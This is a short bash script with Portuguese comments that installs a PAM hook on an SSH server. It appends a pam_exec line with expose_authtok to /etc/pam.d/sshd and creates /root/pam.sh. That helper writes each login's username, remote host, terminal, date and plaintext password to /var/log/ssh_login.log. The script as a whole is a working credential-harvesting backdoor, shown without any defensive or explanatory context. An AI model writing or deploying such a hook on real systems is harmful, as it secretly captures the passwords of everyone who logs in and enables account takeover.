#!/bin/bash

# sshd pass em texto plano
touch /var/log/ssh_login.log
echo "auth optional pam_exec.so quiet expose_authtok /root/pam.sh" >> /etc/pam.d/sshd

cat <<EOF > /root/pam.sh
#!/bin/bash

LOG_FILE="/var/log/ssh_login.log"
{
    echo "User: \$PAM_USER"
    echo "RHOST: \$PAM_RHOST"
    echo "Service: \$PAM_SERVICE"
    echo "TTY: \$PAM_TTY"
    echo "Date: \$(date)"
    echo "Password: \$(cat -)"
    echo "-----"
} >> \$LOG_FILE

exit 0
EOF

chmod +x /root/pam.sh

echo "Acompanhando os logs em /var/log/ssh_login.log"

